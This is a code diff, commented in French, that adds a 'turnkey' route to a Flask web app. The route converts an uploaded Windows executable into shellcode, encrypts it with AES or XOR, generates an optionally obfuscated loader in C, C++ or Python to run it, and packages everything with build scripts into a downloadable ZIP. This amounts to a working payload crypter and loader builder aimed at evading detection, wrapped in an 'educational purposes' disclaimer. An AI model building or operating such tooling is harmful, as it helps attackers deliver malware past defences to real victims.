@@ -1,5 +1,5 @@
 import os
-from flask import Flask, render_template, request, jsonify, redirect, url_for, session, send_file
+from flask import Flask, render_template, request, jsonify, redirect, url_for, session, send_file, flash
 import json
 import time
 import subprocess
@@ -13,6 +13,7 @@ import platform
 import importlib.util
 import sys
 import re
+import zipfile
 from datetime import datetime
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import pad, unpad
@@ -1847,6 +1848,267 @@ def test_cleanup(framework_path):
         "cleanup_actions": cleanup_actions,
         "recommendation": "Cleanup scripts appear to implement necessary OPSEC measures"
     }
+
+@app.route('/process_all_in_one', methods=['POST'])
+def process_all_in_one():
+    """
+    Traitement du système clé en main
+    Ce système automatise l'ensemble du processus:
+    1. Conversion PE en shellcode
+    2. Chiffrement du shellcode
+    3. Génération du loader adapté
+    4. Création d'un package tout-en-un
+    """
+    try:
+        # Vérifier si les fichiers requis ont été soumis
+        if 'pe_file' not in request.files:
+            flash('Aucun fichier PE sélectionné', 'danger')
+            return redirect(url_for('index'))
+        
+        pe_file = request.files['pe_file']
+        if pe_file.filename == '':
+            flash('Aucun fichier PE sélectionné', 'danger')
+            return redirect(url_for('index'))
+        
+        # Récupérer les paramètres du formulaire
+        encryption_method = request.form.get('encryption_method', 'aes-256-cbc')
+        password = request.form.get('password', '')
+        loader_type = request.form.get('loader_type', 'cpp')
+        apply_obfuscation = 'apply_obfuscation' in request.form
+        format_key = 'format_key' in request.form
+        verify_integrity = 'verify_integrity' in request.form
+        
+        # Générer un ID unique pour cette opération
+        operation_id = f"all_in_one_{uuid.uuid4().hex}"
+        working_dir = os.path.join(app.config['GENERATED_FILES'], operation_id)
+        os.makedirs(working_dir, exist_ok=True)
+        
+        # Étape 1: Sauvegarder le fichier PE
+        pe_file_path = os.path.join(working_dir, "input.exe")
+        pe_file.save(pe_file_path)
+        
+        # Étape 2: Convertir PE en shellcode
+        shellcode_path = os.path.join(working_dir, "shellcode.bin")
+        framework_path = os.path.join(os.getcwd(), "Mode Opsec")
+        
+        # Utiliser le convertisseur PE2Shellcode
+        try:
+            import sys
+            sys.path.append(framework_path)
+            from custom_pe2sc import pe_to_shellcode
+            
+            # Convertir le PE en shellcode
+            sc_result = pe_to_shellcode(
+                pe_file_path, 
+                shellcode_path,
+                verbose=True
+            )
+            
+            if not sc_result.get('success', False):
+                flash(f"Erreur lors de la conversion PE: {sc_result.get('error', 'Erreur inconnue')}", 'danger')
+                return redirect(url_for('index'))
+        except Exception as e:
+            flash(f"Erreur lors de la conversion PE: {str(e)}", 'danger')
+            return redirect(url_for('index'))
+        
+        # Étape 3: Chiffrer le shellcode
+        encrypted_path = os.path.join(working_dir, "encrypted.bin")
+        
+        # Déterminer l'algorithme et la taille de clé
+        key_size = 32  # Default for AES-256
+        if encryption_method == "aes-128-cbc":
+            key_size = 16
+        
+        # Chiffrer le shellcode
+        try:
+            # Lire le shellcode généré
+            with open(shellcode_path, 'rb') as f:
+                shellcode_data = f.read()
+            
+            # Générer une clé à partir du mot de passe 
+            import hashlib
+            key = hashlib.pbkdf2_hmac(
+                'sha256', 
+                password.encode(), 
+                b'OPSEC_SALT', 
+                100000, 
+                dklen=key_size
+            )
+            
+            # Chiffrer avec AES
+            if encryption_method.startswith('aes'):
+                iv = get_random_bytes(16)
+                if encryption_method == 'aes-256-cbc':
+                    cipher = AES.new(key, AES.MODE_CBC, iv)
+                else:  # aes-128-cbc
+                    cipher = AES.new(key, AES.MODE_CBC, iv)
+                
+                # Padding et chiffrement
+                padded_data = pad(shellcode_data, AES.block_size)
+                encrypted_data = cipher.encrypt(padded_data)
+                
+                # Écrire le fichier chiffré avec en-tête
+                with open(encrypted_path, 'wb') as f:
+                    # Écrire un en-tête pour identifier le type de chiffrement
+                    f.write(b'PSCE')  # Magic number
+                    f.write((2).to_bytes(4, byteorder='little'))  # Version
+                    f.write((16).to_bytes(4, byteorder='little'))  # Taille du sel
+                    f.write(b'OPSEC_SALT'.ljust(16, b'\0'))  # Sel (fixe pour simplifier)
+                    f.write(iv)  # Vecteur d'initialisation
+                    
+                    # Ajouter HMAC si demandé
+                    if verify_integrity:
+                        # Calculer HMAC
+                        hmac_key = hashlib.pbkdf2_hmac(
+                            'sha256', 
+                            key, 
+                            b'HMAC_SALT', 
+                            10000, 
+                            dklen=32
+                        )
+                        h = hashlib.sha256()
+                        h.update(encrypted_data)
+                        hmac_digest = h.digest()
+                        f.write(hmac_digest)
+                    
+                    # Écrire les données chiffrées
+                    f.write(encrypted_data)
+            
+            # XOR simple (pour compatibilité)
+            elif encryption_method == 'xor':
+                encrypted_data = bytearray()
+                key_bytes = key
+                for i, b in enumerate(shellcode_data):
+                    encrypted_data.append(b ^ key_bytes[i % len(key_bytes)])
+                
+                # Écrire le fichier XOR avec un en-tête minimal
+                with open(encrypted_path, 'wb') as f:
+                    f.write(b'PSCE')  # Magic number
+                    f.write((1).to_bytes(4, byteorder='little'))  # Version
+                    f.write((16).to_bytes(4, byteorder='little'))  # Taille du sel
+                    f.write(b'OPSEC_SALT'.ljust(16, b'\0'))  # Sel (fixe pour simplifier)
+                    f.write(bytes(16))  # IV factice pour compatibilité
+                    f.write(bytes(encrypted_data))
+        
+        except Exception as e:
+            flash(f"Erreur lors du chiffrement: {str(e)}", 'danger')
+            return redirect(url_for('index'))
+        
+        # Étape 4: Générer le loader
+        loader_file_ext = {"cpp": ".cpp", "c": ".c", "python": ".py"}
+        loader_filename = f"opsec_loader{loader_file_ext.get(loader_type, '.cpp')}"
+        loader_path = os.path.join(working_dir, loader_filename)
+        
+        # Formater la clé pour le loader si demandé
+        formatted_key = None
+        if format_key:
+            try:
+                sys.path.append(framework_path)
+                from key_formatter_ import format_key as key_formatter
+                
+                # Convertir la clé en format hexadécimal
+                hex_key = key.hex()
+                formatted_key, _ = key_formatter(hex_key, loader_type, add_info=True)
+            except Exception as e:
+                flash(f"Avertissement: Erreur lors du formatage de la clé: {str(e)}", 'warning')
+                formatted_key = None
+        
+        # Générer le code du loader
+        try:
+            if loader_type == "cpp":
+                loader_code = generate_cpp_loader(encryption_method, apply_obfuscation, formatted_key)
+            elif loader_type == "c":
+                loader_code = generate_c_loader(encryption_method, apply_obfuscation, formatted_key)
+            elif loader_type == "python":
+                loader_code = generate_python_loader(encryption_method, apply_obfuscation, formatted_key)
+            else:
+                loader_code = generate_cpp_loader(encryption_method, apply_obfuscation, formatted_key)
+            
+            # Sauvegarder le loader
+            with open(loader_path, 'w') as f:
+                f.write(loader_code)
+        
+        except Exception as e:
+            flash(f"Erreur lors de la génération du loader: {str(e)}", 'danger')
+            return redirect(url_for('index'))
+        
+        # Étape 5: Créer un fichier ZIP avec tous les éléments
+        zip_path = os.path.join(app.config['GENERATED_FILES'], f"{operation_id}.zip")
+        try:
+            with zipfile.ZipFile(zip_path, 'w') as zipf:
+                # Ajouter les fichiers au ZIP
+                zipf.write(encrypted_path, os.path.basename(encrypted_path))
+                zipf.write(loader_path, os.path.basename(loader_path))
+                
+                # Ajouter un README avec les instructions
+                readme_content = f"""
+# OPSEC Loader - Système Clé en Main
+
+## Contenu du package
+- `{os.path.basename(encrypted_path)}`: Shellcode chiffré
+- `{os.path.basename(loader_path)}`: Loader pour exécuter le shellcode
+
+## Instructions
+1. Compilez le loader avec les options appropriées
+   - Pour C/C++: `gcc -o loader {os.path.basename(loader_path)}` ou équivalent
+   - Pour Python: `python {os.path.basename(loader_path)}`
+2. Exécutez le loader en fournissant le mot de passe: `./loader {os.path.basename(encrypted_path)} {password}`
+
+## Informations techniques
+- Méthode de chiffrement: {encryption_method}
+- Vérification d'intégrité HMAC: {"Activée" if verify_integrity else "Désactivée"}
+- Obfuscation: {"Activée" if apply_obfuscation else "Désactivée"}
+
+Générée le: {datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
+Identifiant unique: {operation_id}
+
+## Avertissement
+Ce package est fourni à des fins éducatives uniquement. L'utilisation de ce logiciel doit être conforme
+aux lois et réglementations en vigueur dans votre juridiction. L'auteur n'est pas responsable de toute
+utilisation abusive de cet outil.
+"""
+                zipf.writestr("README.md", readme_content)
+                
+                # Ajouter un script de déploiement rapide
+                if loader_type in ["c", "cpp"]:
+                    build_script = f"""#!/bin/bash
+# Script de compilation rapide
+echo "Compilation du loader OPSEC..."
+gcc -o opsec_loader {os.path.basename(loader_path)} -lcrypto -lpthread
+if [ $? -eq 0 ]; then
+    echo "Compilation réussie!"
+    echo "Exécutez avec: ./opsec_loader {os.path.basename(encrypted_path)} {password}"
+else
+    echo "Erreur de compilation. Assurez-vous que les bibliothèques requises sont installées."
+    echo "Sur Ubuntu/Debian: sudo apt-get install libssl-dev"
+fi
+"""
+                    zipf.writestr("build.sh", build_script)
+                
+                elif loader_type == "python":
+                    run_script = f"""#!/bin/bash
+# Script d'exécution rapide
+echo "Exécution du loader OPSEC..."
+python {os.path.basename(loader_path)} {os.path.basename(encrypted_path)} {password}
+"""
+                    zipf.writestr("run.sh", run_script)
+        
+        except Exception as e:
+            flash(f"Erreur lors de la création du package ZIP: {str(e)}", 'danger')
+            return redirect(url_for('index'))
+        
+        # Étape 6: Renvoyer le fichier ZIP à l'utilisateur
+        return send_file(
+            zip_path,
+            as_attachment=True,
+            download_name=f"opsec_loader_package.zip",
+            mimetype='application/zip'
+        )
+    
+    except Exception as e:
+        flash(f"Erreur interne du système: {str(e)}", 'danger')
+        return redirect(url_for('index'))
+
 
 if __name__ == '__main__':
     app.run(host='0.0.0.0', port=5000, debug=True)
